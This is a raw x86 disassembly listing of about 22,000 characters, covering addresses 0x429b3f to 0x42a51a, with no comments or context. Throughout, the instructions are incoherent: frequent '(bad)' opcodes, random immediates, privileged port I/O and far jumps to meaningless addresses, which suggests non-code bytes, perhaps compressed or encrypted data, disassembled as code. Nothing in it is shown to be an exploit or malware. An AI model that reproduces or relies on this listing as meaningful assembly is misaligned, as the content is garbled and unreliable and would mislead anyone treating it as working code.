  429b3f:	ret    0xab43
  429b42:	repz lahf 
  429b44:	add    bh,BYTE PTR [edx+0xf50001]
  429b4a:	add    BYTE PTR [eax],al
  429b4c:	adc    dl,BYTE PTR [eax+0x72330763]
  429b52:	mov    BYTE PTR [esp+edx*2+0x6b],bh
  429b56:	dec    esi
  429b57:	jbe    0x429bbd
  429b59:	out    0x16,eax
  429b5b:	sub    al,0x5d
  429b5d:	or     al,0x93
  429b5f:	pop    eax
  429b60:	ret    
  429b61:	xor    DWORD PTR [eax],edx
  429b63:	lahf   
  429b64:	lea    ebx,[eax]
  429b66:	imul   ax,WORD PTR [edi+0x36],0xffed
  429b6b:	sbb    esi,eax
  429b6d:	add    DWORD PTR [edi],ecx
  429b6f:	rol    ch,cl
  429b71:	(bad)  
  429b72:	fstp   DWORD PTR [ecx-0x4ca4a2b6]
  429b78:	int    0x4b
  429b7a:	mov    BYTE PTR [edi+ecx*8+0x5bda66db],bl
  429b81:	push   cs
  429b82:	dec    ebx
  429b83:	xor    BYTE PTR [edi+0x14667ccc],ch
  429b89:	loop   0x429b3c
  429b8b:	push   edx
  429b8c:	mov    al,ds:0x808342d3
  429b91:	in     eax,0x17
  429b93:	sbb    BYTE PTR [ecx+0x10],dh
  429b96:	sbb    al,0xe9
  429b98:	sti    
  429b99:	mov    edx,0x7cc76f2b
  429b9e:	hlt    
  429b9f:	out    0x9f,eax
  429ba1:	push   ss
  429ba2:	cld    
  429ba3:	cmp    eax,0xbc907bc0
  429ba8:	adc    DWORD PTR [ecx+edx*4+0x12bd72f6],esp
  429baf:	dec    esi
  429bb0:	stos   BYTE PTR es:[edi],al
  429bb1:	mov    bl,0xea
  429bb3:	(bad)  
  429bb5:	sub    cl,al
  429bb7:	push   eax
  429bb8:	pop    edi
  429bb9:	ja     0x429b8f
  429bbb:	jne    0x429b88
  429bbd:	outs   dx,BYTE PTR ds:[esi]
  429bbe:	(bad)  
  429bbf:	fsub   st(6),st
  429bc1:	stos   BYTE PTR es:[edi],al
  429bc2:	fcomp  QWORD PTR [eax-0x6ab521dd]
  429bc8:	ja     0x429c2a
  429bca:	aaa    
  429bcb:	popf   
  429bcc:	pop    ebx
  429bcd:	pushf  
  429bce:	jnp    0x429be4
  429bd0:	popa   
  429bd1:	dec    esp
  429bd2:	mov    ch,0x8b
  429bd4:	jns    0x429c39
  429bd6:	stc    
  429bd7:	mov    DWORD PTR [ebx],0x8ccdfcb5
  429bdd:	sbb    esp,DWORD PTR [esi-0x62]
  429be0:	cmc    
  429be1:	mov    edx,0xe746300c
  429be6:	jne    0x429b98
  429be8:	scas   eax,DWORD PTR es:[edi]
  429be9:	fiadd  DWORD PTR [eax-0x64]
  429bec:	add    BYTE PTR [ecx+0x3bdcc613],ah
  429bf2:	fst    QWORD PTR [edx-0xd6057ae]
  429bf8:	or     BYTE PTR [edx],bl
  429bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bfb:	ror    BYTE PTR [eax-0x12],1
  429bfe:	mov    ds:0xc2aae6f,al
  429c03:	adc    eax,edi
  429c05:	sbb    eax,ebp
  429c07:	xchg   cl,bl
  429c09:	xchg   esi,eax
  429c0a:	test   BYTE PTR [edi],bh
  429c0c:	bnd jne 0x429c63
  429c0f:	pop    eax
  429c10:	xor    ebx,ebp
  429c12:	or     eax,0xf6fd8c46
  429c17:	sar    DWORD PTR [esi],0x14
  429c1a:	push   ss
  429c1b:	cwde   
  429c1c:	fist   WORD PTR [esi+0x2de16571]
  429c22:	data16 add bl,BYTE PTR fs:[esi]
  429c26:	jle    0x429bc1
  429c28:	popa   
  429c29:	test   DWORD PTR [ebx-0x42],eax
  429c2c:	stos   BYTE PTR es:[edi],al
  429c2d:	gs push ebx
  429c2f:	hlt    
  429c30:	fistp  QWORD PTR [edi-0x5f]
  429c33:	pop    ss
  429c34:	je     0x429c0d
  429c36:	push   ebx
  429c37:	bound  ebp,QWORD PTR [ebp-0x417e1dde]
  429c3d:	repz test eax,0xed2c
	...
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	scas   eax,DWORD PTR es:[edi]
  429cc1:	xchg   ebp,eax
  429cc2:	jns    0x429cd1
  429cc4:	idiv   DWORD PTR [edx+0xf50001]
  429cca:	add    BYTE PTR [eax],al
  429ccc:	retf   
  429ccd:	lds    edi,FWORD PTR [ebp-0x2]
  429cd0:	xlat   BYTE PTR es:[ebx]
  429cd2:	(bad)  [edi+ecx*1+0x33]
  429cd6:	call   0x9bcc655e
  429cdb:	stc    
  429cdc:	sub    eax,0x8893dab1
  429ce1:	out    dx,al
  429ce2:	das    
  429ce3:	sub    eax,0xa7fb6314
  429ce8:	les    esi,FWORD PTR gs:[esi-0x40]
  429cec:	mov    esi,0x992f5074
  429cf1:	mov    bh,0x12
  429cf3:	xlat   BYTE PTR ds:[ebx]
  429cf4:	aam    0x74
  429cf6:	call   DWORD PTR [edi+0x4379956b]
  429cfc:	mov    ebx,gs
  429cfe:	jmp    0x6f49:0x7511cacd
  429d05:	adc    al,0x76
  429d07:	jae    0x429d58
  429d09:	xlat   BYTE PTR ds:[ebx]
  429d0a:	sbb    edx,DWORD PTR [esi-0x7df62c64]
  429d10:	pop    ss
  429d11:	and    ch,BYTE PTR [eax]
  429d13:	loope  0x429d52
  429d15:	mov    ebp,0xc8d0b59
  429d1a:	out    0xf8,eax
  429d1c:	and    BYTE PTR [ebx+0x49],bh
  429d1f:	mov    dh,0x45
  429d21:	xchg   ebx,eax
  429d22:	mov    dl,BYTE PTR [ebp+0x71]
  429d25:	sub    eax,0x3b56ef3
  429d2a:	xor    bh,BYTE PTR [ebp+ecx*2-0x6ccdb2e6]
  429d31:	and    edx,DWORD PTR [edx-0x45]
  429d34:	xchg   ecx,eax
  429d35:	mov    eax,0xbdcaf19
  429d3a:	enter  0x14c7,0xf2
  429d3e:	fdiv   QWORD PTR [ecx]
  429d40:	mov    bh,0xca
  429d42:	test   al,0x9f
  429d44:	call   0xfca47c73
  429d49:	iret   
  429d4a:	mov    ds:0x3e0613a5,eax
  429d4f:	mov    BYTE PTR [edi+0x60eee841],dh
  429d55:	ret    0xe83
  429d58:	or     al,BYTE PTR [edi]
  429d5a:	add    ebx,DWORD PTR [edx+0x116e6647]
  429d60:	sub    eax,0xe3226ac1
  429d65:	mov    edi,edi
  429d67:	xor    ebx,ebp
  429d69:	lods   al,BYTE PTR ds:[esi]
  429d6a:	mov    dh,0x18
  429d6c:	pusha  
  429d6d:	xchg   BYTE PTR [esi],bl
  429d6f:	in     eax,dx
  429d70:	inc    eax
  429d71:	mov    cl,dh
  429d73:	pop    edi
  429d74:	stos   DWORD PTR es:[edi],eax
  429d75:	xor    edx,ebx
  429d77:	mov    ebp,0xf8210eb9
  429d7c:	or     BYTE PTR [esi+eax*4-0xa718658],dh
  429d83:	cmp    bl,cl
  429d85:	(bad)  
  429d86:	out    0xc6,eax
  429d88:	es push ebp
  429d8a:	popf   
  429d8b:	jb     0x429de2
  429d8d:	aad    0xd5
  429d8f:	xor    al,0x4a
  429d91:	ins    BYTE PTR es:[edi],dx
  429d92:	(bad)  [edx+ecx*1]
  429d95:	sub    ecx,DWORD PTR [esi-0x54]
  429d98:	ret    0xda05
  429d9b:	daa    
  429d9c:	test   BYTE PTR [edi],bl
  429d9e:	adc    ebx,DWORD PTR [esi]
  429da0:	stos   DWORD PTR es:[edi],eax
  429da1:	pop    eax
  429da2:	dec    esi
  429da3:	loop   0x429d4f
  429da5:	lods   al,BYTE PTR ds:[esi]
  429da6:	and    DWORD PTR [ebp+0xa],edi
  429da9:	mov    ds:0x63830f1e,al
  429dae:	mov    al,ds:0x18ff2b2
  429db3:	pop    ds
  429db4:	pop    eax
  429db5:	cmp    bl,BYTE PTR [edx+0x21]
  429db8:	inc    edi
  429db9:	xchg   esp,eax
  429dba:	or     BYTE PTR [ecx],bl
  429dbc:	fs pop edi
  429dbe:	push   ebp
  429dbf:	ret    0x8a
	...
  429e32:	add    BYTE PTR [eax],al
  429e34:	dec    edi
  429e35:	pop    ebp
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax-0xab1d120]
  429e41:	jo     0x429e2d
  429e43:	xchg   ah,ch
  429e45:	mov    ebx,0xf50001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	mov    al,0xe9
  429e4e:	dec    edx
  429e4f:	mov    dh,0x47
  429e51:	cld    
  429e52:	dec    ecx
  429e53:	dec    ebp
  429e54:	pop    edx
  429e55:	lods   al,BYTE PTR ds:[esi]
  429e56:	xchg   ecx,eax
  429e57:	loope  0x429e75
  429e59:	and    esp,DWORD PTR [ecx]
  429e5b:	(bad)  
  429e5c:	pop    esi
  429e5d:	into   
  429e5e:	pusha  
  429e5f:	mov    esi,0x7fe67f69
  429e64:	sub    al,0xea
  429e66:	xchg   ecx,eax
  429e67:	xchg   esi,eax
  429e68:	sub    BYTE PTR [ebx],cl
  429e6a:	add    DWORD PTR [eax+0x14471dda],0xc1571a05
  429e74:	out    dx,al
  429e75:	fwait
  429e76:	dec    edx
  429e77:	add    BYTE PTR [ecx+0x1c20be4f],bh
  429e7d:	xor    ah,BYTE PTR [edx-0x80]
  429e80:	ds push ecx
  429e82:	jp     0x429eef
  429e84:	push   0x40
  429e86:	rol    DWORD PTR [ebx+0x1a],0x35
  429e8a:	push   0xffffffe9
  429e8c:	in     al,0xbc
  429e8e:	sbb    edi,DWORD PTR [edx-0x26]
  429e91:	mov    ecx,0xd9e51787
  429e96:	jge    0x429e3b
  429e98:	inc    eax
  429e99:	js     0x429ef9
  429e9b:	loope  0x429e46
  429e9d:	jne    0x429e8a
  429e9f:	dec    ebx
  429ea0:	(bad)  
  429ea2:	adc    BYTE PTR [esi-0x3953810d],dh
  429ea8:	(bad)  
  429ea9:	loop   0x429e4a
  429eab:	sbb    al,al
  429ead:	xchg   ebp,eax
  429eae:	dec    eax
  429eaf:	mov    eax,0x9a957fe2
  429eb4:	add    al,0x15
  429eb6:	das    
  429eb7:	inc    esp
  429eb8:	push   edi
  429eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429eba:	add    DWORD PTR [eax+0x60],0x934ac4de
  429ec1:	xlat   BYTE PTR ds:[ebx]
  429ec2:	out    dx,al
  429ec3:	jmp    0x429e90
  429ec5:	cmp    eax,0x95fe4de9
  429eca:	jb     0x429e81
  429ecc:	mov    ecx,0xc9c03067
  429ed1:	ds xchg ebp,eax
  429ed3:	pop    ds
  429ed4:	icebp  
  429ed5:	scas   al,BYTE PTR es:[edi]
  429ed6:	sbb    DWORD PTR [edi*1-0x13ef7384],esi
  429edd:	lea    ebx,[edi]
  429edf:	cli    
  429ee0:	xchg   DWORD PTR [esi+0x2c],ebx
  429ee3:	les    eax,FWORD PTR [eax-0x49]
  429ee6:	mov    esi,0xb8ab812
  429eeb:	fstp   QWORD PTR [ecx+0xc3ed599]
  429ef1:	xchg   bh,al
  429ef3:	shl    edi,cl
  429ef5:	(bad)  
  429ef6:	es icebp 
  429ef8:	xor    ebx,DWORD PTR [ebx]
  429efa:	adc    esp,edi
  429efc:	push   edx
  429efd:	les    ebp,FWORD PTR ss:[edi]
  429f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f01:	stos   BYTE PTR es:[edi],al
  429f02:	adc    eax,0xfa6096fe
  429f07:	(bad)  
  429f08:	push   ecx
  429f09:	adc    edi,DWORD PTR ds:0xb97c4880
  429f0f:	mov    edx,0x41caffe2
  429f14:	push   0x4d50b654
  429f19:	inc    ecx
  429f1a:	push   edx
  429f1b:	cmp    bl,BYTE PTR ds:0xa0c6ee26
  429f21:	js     0x429f53
  429f23:	dec    esp
  429f24:	fidivr DWORD PTR ds:0x4cd2667f
  429f2a:	sbb    al,0x2b
  429f2c:	mov    BYTE PTR [ebp+0x32058707],bl
  429f32:	repz or eax,0xa1238a5b
  429f38:	cmp    BYTE PTR [ebx],bh
  429f3a:	aaa    
  429f3b:	ror    BYTE PTR [edi],1
  429f3d:	sbb    BYTE PTR [edi-0xc],bl
  429f40:	sbb    BYTE PTR [eax],al
	...
  429fb2:	add    BYTE PTR [eax],al
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x671a6d7b]
  429fc2:	lods   al,BYTE PTR ds:[esi]
  429fc3:	mov    ds:0x1bce1,al
  429fc8:	cmc    
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [eax-0x11],ch
  429fce:	or     dl,ah
  429fd0:	add    ch,ah
  429fd2:	inc    esp
  429fd3:	inc    eax
  429fd4:	std    
  429fd5:	pop    eax
  429fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fd7:	sbb    BYTE PTR [ebx-0x267539e6],cl
  429fdd:	dec    esi
  429fde:	hlt    
  429fdf:	loop   0x429f7e
  429fe1:	scas   eax,DWORD PTR es:[edi]
  429fe2:	fwait
  429fe3:	push   cs
  429fe4:	mov    ds:0x5877bb79,eax
  429fe9:	push   ecx
  429fea:	inc    ebx
  429feb:	xor    DWORD PTR [edx-0x50],ebx
  429fee:	out    dx,al
  429fef:	push   edi
  429ff0:	xchg   edx,eax
  429ff1:	sub    eax,0x4c2c358e
  429ff6:	cmc    
  429ff7:	mov    edi,0xc7a4d2d9
  429ffc:	pop    ss
  429ffd:	fadd   st,st(6)
  429fff:	icebp  
  42a000:	jno    0x429fa2
  42a002:	scas   eax,DWORD PTR es:[edi]
  42a003:	dec    esi
  42a004:	ret    
  42a005:	xor    ah,bh
  42a007:	xchg   DWORD PTR [edi*8+0x4b59ecb5],ebx
  42a00e:	sbb    BYTE PTR [esi],ah
  42a010:	pusha  
  42a011:	pop    edi
  42a012:	imul   esi,DWORD PTR [edi-0x250bca06],0x14
  42a019:	sub    esi,DWORD PTR [esi*1+0x54e5337a]
  42a020:	ror    BYTE PTR [eax+0x450d3270],1
  42a026:	mov    ?,WORD PTR [edx+0xa]
  42a029:	leave  
  42a02a:	adc    al,0x7f
  42a02c:	out    0xef,eax
  42a02e:	(bad)  
  42a02f:	das    
  42a030:	add    al,0x80
  42a032:	and    eax,0xf4569129
  42a037:	mov    ch,0xbb
  42a039:	scas   eax,DWORD PTR es:[edi]
  42a03a:	ins    DWORD PTR es:[edi],dx
  42a03b:	inc    esi
  42a03c:	pop    esp
  42a03d:	sbb    eax,0xf1b446c
  42a042:	sahf   
  42a043:	cli    
  42a044:	push   ds
  42a045:	push   esi
  42a046:	adc    BYTE PTR ss:[edi],dh
  42a049:	push   ss
  42a04a:	(bad)  
  42a04b:	pop    ds
  42a04c:	inc    ecx
  42a04d:	mov    edi,ecx
  42a04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a050:	ss stos BYTE PTR es:[edi],al
  42a052:	inc    ebp
  42a053:	clc    
  42a054:	pushf  
  42a055:	mov    eax,0x79d7f963
  42a05a:	push   cs
  42a05b:	push   cs
  42a05c:	ins    DWORD PTR es:[edi],dx
  42a05d:	jnp    0x429fe2
  42a05f:	cld    
  42a060:	icebp  
  42a061:	int    0x2e
  42a063:	retf   0x642d
  42a066:	gs cdq 
  42a068:	loopne 0x42a08e
  42a06a:	jp     0x42a0cf
  42a06c:	add    ecx,DWORD PTR [ecx-0x68ce981d]
  42a072:	aad    0xc9
  42a074:	mov    edx,0x6c46a026
  42a079:	push   ebx
  42a07a:	mov    dh,0xba
  42a07c:	(bad)  [ebp-0x20]
  42a07f:	sbb    ecx,DWORD PTR [ebx]
  42a081:	nop
  42a082:	loopne 0x42a07d
  42a084:	inc    ebx
  42a085:	es in  eax,0x49
  42a088:	fst    DWORD PTR [ecx]
  42a08a:	pusha  
  42a08b:	mov    bl,0xf0
  42a08d:	cwde   
  42a08e:	aad    0x7f
  42a090:	sub    BYTE PTR [esi+0x19],ch
  42a093:	iret   
  42a094:	pop    esp
  42a095:	jnp    0x42a021
  42a097:	fwait
  42a098:	mov    ds:0x5a6e320b,al
  42a09d:	test   BYTE PTR [eax+0x748763b],0xc
  42a0a4:	mov    ah,0x12
  42a0a6:	xor    edi,DWORD PTR [edx-0x7d320353]
  42a0ac:	cmp    bl,BYTE PTR [esp+eiz*4+0x71cfae3]
  42a0b3:	pop    ds
  42a0b4:	ds push ebx
  42a0b6:	xor    al,0x8
  42a0b8:	sbb    ecx,edi
  42a0ba:	xor    DWORD PTR [esi-0x7abb42b2],eax
  42a0c0:	lahf   
	...
  42a131:	add    BYTE PTR [eax],al
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	pop    ds
  42a141:	lods   eax,DWORD PTR ds:[esi]
  42a142:	cmp    dh,BYTE PTR [esi+edx*8-0xafffe43]
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    al,ch
  42a14d:	retf   0xe8a4
  42a150:	mov    dh,0x46
  42a152:	push   esp
  42a153:	add    al,0x64
  42a155:	or     bh,dh
  42a157:	call   0x195f5c45
  42a15c:	mov    ebx,DWORD PTR [ecx]
  42a15e:	xchg   edi,eax
  42a15f:	fwait
  42a160:	lock sbb al,0xf7
  42a163:	dec    ebx
  42a164:	or     BYTE PTR [ebx],al
  42a166:	fs jne 0x42a1b3
  42a169:	fist   WORD PTR [eax-0x1e]
  42a16c:	sub    edx,ecx
  42a16e:	clc    
  42a16f:	aas    
  42a170:	mov    cl,0xea
  42a172:	shl    esi,1
  42a174:	sbb    BYTE PTR [ebp-0xff01ec4],ch
  42a17a:	shl    DWORD PTR [ebx],cl
  42a17c:	outs   dx,DWORD PTR ds:[esi]
  42a17d:	jnp    0x42a19a
  42a17f:	dec    ebx
  42a180:	jecxz  0x42a142
  42a182:	sbb    DWORD PTR [eax+0x47],edi
  42a185:	xchg   ecx,eax
  42a186:	and    edx,0x38
  42a189:	jl     0x42a206
  42a18b:	mov    ebp,0x8f789d70
  42a190:	mov    dh,0xce
  42a192:	cld    
  42a193:	bound  ecx,QWORD PTR [eax-0x79]
  42a196:	sar    dh,cl
  42a198:	adc    al,0xeb
  42a19a:	rcl    DWORD PTR [eax],1
  42a19c:	add    eax,0x96994301
  42a1a1:	push   edi
  42a1a2:	pusha  
  42a1a3:	push   esi
  42a1a4:	ins    DWORD PTR es:[edi],dx
  42a1a5:	xchg   ecx,eax
  42a1a6:	fnstsw WORD PTR [edi]
  42a1a8:	jns    0x42a1e7
  42a1aa:	push   ss
  42a1ab:	lock jo 0x42a1a4
  42a1ae:	or     bh,BYTE PTR [ebx+0x1]
  42a1b1:	mov    DWORD PTR [edi-0x25],ecx
  42a1b4:	ficom  DWORD PTR [ebx]
  42a1b6:	test   eax,0x5874f294
  42a1bb:	fs or  ecx,edi
  42a1be:	dec    ecx
  42a1bf:	jno    0x42a214
  42a1c1:	sbb    eax,0x44944628
  42a1c6:	pushf  
  42a1c7:	loope  0x42a1d9
  42a1c9:	pop    edx
  42a1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1cb:	mov    eax,0x999bc164
  42a1d0:	sbb    eax,DWORD PTR [ebp+0x46e09131]
  42a1d6:	mov    al,ch
  42a1d8:	int3   
  42a1d9:	mov    eax,0x9634f91
  42a1de:	mov    fs,WORD PTR [ecx+0x7]
  42a1e1:	pop    eax
  42a1e2:	pop    edi
  42a1e3:	cdq    
  42a1e4:	aam    0x3f
  42a1e6:	sub    al,0x83
  42a1e8:	push   ebx
  42a1e9:	(bad)  
  42a1ea:	cmp    edx,DWORD PTR [edx-0x3c]
  42a1ed:	push   es
  42a1ee:	xchg   ebx,eax
  42a1ef:	ins    DWORD PTR es:[edi],dx
  42a1f0:	mov    eax,ds:0x127e6210
  42a1f5:	inc    ecx
  42a1f6:	mov    edi,0xb6b5f2
  42a1fb:	retf   0x7a3f
  42a1fe:	test   BYTE PTR [eax+ecx*2-0x25b1559f],al
  42a205:	loopne 0x42a1a6
  42a207:	jp     0x42a1ea
  42a209:	outs   dx,BYTE PTR ds:[esi]
  42a20a:	fcomp  DWORD PTR [esi-0x57]
  42a20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a20e:	push   cs
  42a20f:	in     al,0x4a
  42a211:	adc    ebp,edi
  42a213:	xchg   ebx,eax
  42a214:	iret   
  42a215:	add    bl,BYTE PTR [ecx]
  42a217:	lods   al,BYTE PTR ds:[esi]
  42a218:	leave  
  42a219:	and    BYTE PTR [edx],al
  42a21b:	fs cmp ah,bh
  42a21e:	mov    fs,WORD PTR [eax-0x39]
  42a221:	test   DWORD PTR ds:0xa2fe162e,0xe36821c0
  42a22b:	aad    0xac
  42a22d:	dec    esi
  42a22e:	(bad)  
  42a230:	adc    DWORD PTR [eax],ebx
  42a232:	loop   0x42a1fc
  42a234:	retf   0x6c22
  42a237:	pop    esi
  42a238:	ins    BYTE PTR es:[edi],dx
  42a239:	aad    0x70
  42a23b:	loopne 0x42a2ae
  42a23d:	sub    edi,DWORD PTR [edx+0xb60]
	...
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x4f7f8ab9
  42a2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2c2:	add    DWORD PTR [ebx],ebx
  42a2c4:	retf   
  42a2c5:	mov    esi,0xf50001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	mov    DWORD PTR [eax],ebp
  42a2ce:	or     esp,DWORD PTR [edi]
  42a2d0:	rol    bl,1
  42a2d2:	outs   dx,BYTE PTR ds:[esi]
  42a2d3:	(bad)
  42a2d6:	lds    esi,FWORD PTR [ebx+0x814e597]
  42a2dc:	call   DWORD PTR [ebx-0x1638e41e]
  42a2e2:	sub    dl,BYTE PTR [ebx+0x63]
  42a2e5:	mul    BYTE PTR [eax]
  42a2e7:	icebp  
  42a2e8:	push   eax
  42a2e9:	add    al,0xb3
  42a2eb:	pop    ds
  42a2ec:	adc    BYTE PTR [eax+0x4337916e],0x7f
  42a2f3:	retf   
  42a2f4:	frstor [eax+ecx*1-0x3c2ab81e]
  42a2fb:	push   0xd7045e61
  42a300:	scas   al,BYTE PTR es:[edi]
  42a301:	xor    al,0x6d
  42a303:	add    ebp,DWORD PTR [eax-0x63108aae]
  42a309:	hlt    
  42a30a:	out    0xd1,al
  42a30c:	cmp    al,0x13
  42a30e:	pop    ebx
  42a30f:	dec    ebx
  42a310:	pop    ebp
  42a311:	pop    edi
  42a312:	iret   
  42a313:	sub    ebx,0xffffffd4
  42a316:	les    ecx,FWORD PTR [edx+0x75]
  42a319:	xchg   esi,eax
  42a31a:	pushf  
  42a31b:	outs   dx,DWORD PTR ds:[esi]
  42a31c:	dec    ecx
  42a31d:	fcom   DWORD PTR [ebx+ebx*4-0x25]
  42a321:	rcl    ecx,cl
  42a323:	dec    ecx
  42a324:	in     eax,dx
  42a325:	mov    edx,0xc64e458d
  42a32a:	leave  
  42a32b:	sub    eax,0x85758ceb
  42a330:	xchg   bl,al
  42a332:	xchg   ebx,eax
  42a333:	mov    ds:0x715431db,eax
  42a338:	ror    DWORD PTR [ebx],1
  42a33a:	test   ecx,0xab2dcb8d
  42a340:	or     DWORD PTR [edi+0x2b222589],esi
  42a346:	push   esi
  42a347:	inc    esi
  42a348:	adc    DWORD PTR [edi-0x19],0x12
  42a34c:	xchg   BYTE PTR [esi+0x18],al
  42a34f:	retf   0x2e98
  42a352:	adc    dh,BYTE PTR [ebp+0x30]
  42a355:	add    BYTE PTR [eax-0x29718ab7],0x95
  42a35c:	out    dx,eax
  42a35d:	out    0xe6,eax
  42a35f:	xchg   BYTE PTR ds:0xe5cca699,ch
  42a365:	jp     0x42a37b
  42a367:	pop    es
  42a368:	sbb    bl,ah
  42a36a:	hlt    
  42a36b:	and    al,0x83
  42a36d:	adc    eax,0x6ae36ec
  42a372:	jg     0x42a3d0
  42a374:	jp     0x42a375
  42a376:	jnp    0x42a39f
  42a378:	(bad)  
  42a379:	mov    ebp,0xdf727407
  42a37e:	sbb    DWORD PTR [esi-0x5b],ebp
  42a381:	in     al,0xd8
  42a383:	mov    WORD PTR [eax-0x2b49edd4],es
  42a389:	(bad)  
  42a38a:	cmp    al,0xf9
  42a38c:	inc    edx
  42a38d:	ret    
  42a38e:	sbb    eax,DWORD PTR [ecx]
  42a390:	mov    DWORD PTR [ebx+0x4c9968a0],esi
  42a396:	xor    esi,ebp
  42a398:	cmp    BYTE PTR [edi+ebp*2],bl
  42a39b:	cmp    al,0xaf
  42a39d:	dec    ebp
  42a39e:	scas   eax,DWORD PTR es:[edi]
  42a39f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a3a0:	scas   al,BYTE PTR es:[edi]
  42a3a1:	lock add BYTE PTR [eiz*4-0x37c4ca29],al
  42a3a9:	cdq    
  42a3aa:	pop    edi
  42a3ab:	mov    es,WORD PTR [edx+0x5c]
  42a3ae:	adc    DWORD PTR [edx+ecx*1+0x39],esp
  42a3b2:	call   0x1fc2:0x94f58a31
  42a3b9:	imul   ebp,DWORD PTR [ecx-0x140656c3],0x67f9
	...
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a46f
  42a441:	push   esp
  42a442:	(bad)  
  42a443:	stos   DWORD PTR es:[edi],eax
  42a444:	sar    BYTE PTR [edi+0xf50001],0x0
  42a44b:	add    bh,ch
  42a44d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a44e:	and    eax,DWORD PTR [edi-0x2]
  42a451:	in     al,dx
  42a452:	bnd jbe 0x42a448
  42a455:	pop    edi
  42a456:	adc    BYTE PTR [edi+0x1b30334f],bh
  42a45c:	aaa    
  42a45d:	js     0x42a459
  42a45f:	pop    ebx
  42a460:	pop    edi
  42a461:	xor    cl,dl
  42a463:	dec    ebx
  42a464:	jb     0x42a479
  42a466:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42a468:	lss    ecx,FWORD PTR [ebp-0x3c]
  42a46c:	sbb    BYTE PTR [esi-0x2e7bdb96],dh
  42a472:	inc    edi
  42a473:	lock mov cl,0x35
  42a476:	push   eax
  42a477:	jb     0x42a4bb
  42a479:	inc    edx
  42a47a:	inc    ecx
  42a47b:	lock push 0x4f
  42a47e:	adc    ecx,ecx
  42a480:	lock pusha 
  42a482:	xchg   ecx,eax
  42a483:	shr    ecx,0xbb
  42a486:	jno    0x42a45c
  42a488:	out    0xbe,al
  42a48a:	lock or ecx,edi
  42a48d:	or     eax,0xf34083e4
  42a492:	pop    esi
  42a493:	sbb    al,0xda
  42a495:	pop    ss
  42a496:	sub    al,0x87
  42a498:	adc    eax,0x8173276a
  42a49d:	dec    ebx
  42a49e:	push   ebx
  42a49f:	xchg   esp,eax
  42a4a0:	mov    dl,0x90
  42a4a2:	loop   0x42a510
  42a4a4:	lahf   
  42a4a5:	cmp    DWORD PTR [esi+0x33e8c722],esi
  42a4ab:	inc    edx
  42a4ac:	scas   al,BYTE PTR es:[edi]
  42a4ad:	xlat   BYTE PTR ds:[ebx]
  42a4ae:	push   ecx
  42a4af:	sub    al,BYTE PTR [esi+0x4f35fb88]
  42a4b5:	mov    dl,bh
  42a4b7:	mov    WORD PTR [ebx-0x642018bc],gs
  42a4bd:	push   edi
  42a4be:	leave  
  42a4bf:	out    dx,eax
  42a4c0:	leave  
  42a4c1:	and    esp,DWORD PTR [edx+0x7a]
  42a4c4:	inc    ebx
  42a4c5:	repz ret 
  42a4c7:	jmp    0xd7f1c12f
  42a4cc:	dec    eax
  42a4cd:	outs   dx,DWORD PTR ds:[esi]
  42a4ce:	fidiv  DWORD PTR [ebx]
  42a4d0:	rol    al,cl
  42a4d2:	push   ss
  42a4d3:	pop    edi
  42a4d4:	cmp    al,bl
  42a4d6:	jmp    0x50a60bac
  42a4db:	(bad)  
  42a4dc:	mov    bh,0xe2
  42a4de:	pop    ebx
  42a4df:	lods   eax,DWORD PTR ds:[esi]
  42a4e0:	rcl    ebp,0x50
  42a4e3:	icebp  
  42a4e4:	jne    0x42a4a0
  42a4e6:	and    BYTE PTR [ecx+0x3310a042],dh
  42a4ec:	mov    cl,0x61
  42a4ee:	dec    esp
  42a4ef:	lock enter 0xae17,0x9f
  42a4f4:	or     eax,0x4e5aada4
  42a4f9:	cs adc DWORD PTR cs:[eax],ebp
  42a4fd:	popf   
  42a4fe:	add    eax,0xcdd0c171
  42a503:	dec    DWORD PTR [edx-0x569ca450]
  42a509:	popf   
  42a50a:	pop    esp
  42a50b:	push   ss
  42a50c:	stos   DWORD PTR es:[edi],eax
  42a50d:	cwde   
  42a50e:	cld    
  42a50f:	arpl   WORD PTR [ebx],cx
  42a511:	inc    ebx
  42a512:	xor    al,0x42
  42a514:	xor    al,0xb2
  42a516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a517:	jb     0x42a4a8
  42a519:	inc    ebx
  42a51a:	and    eax,ebx
